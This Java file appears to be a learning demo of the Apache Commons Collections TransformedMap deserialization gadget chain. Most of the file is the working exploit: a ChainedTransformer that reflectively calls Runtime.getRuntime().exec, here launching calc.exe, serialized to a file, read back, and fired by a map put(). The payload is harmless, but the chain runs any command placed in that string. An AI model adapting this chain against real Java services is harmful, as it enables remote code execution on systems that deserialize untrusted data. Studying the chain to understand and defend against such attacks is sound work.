package demo.TransformedMap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;


public class Demo6 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        Transformer chain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        //another way, must used "put" first then u can use entrySet().iterator().next()
        //innerMap.put("foo", "bar");
        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
        //序列化
        FileOutputStream file = new FileOutputStream("chenlvtang.bin");
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(outerMap);
        se.close();
        //反序列化
        FileInputStream file1 = new FileInputStream("chenlvtang.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        Map outerMap_now =  (Map)unse.readObject();
        unse.close();

        outerMap_now.put("x","y");
        //another way
        //Map.Entry onlyElement = (Map.Entry) outerMap_now.entrySet().iterator().next();
        //onlyElement.setValue("foobar");
    }
}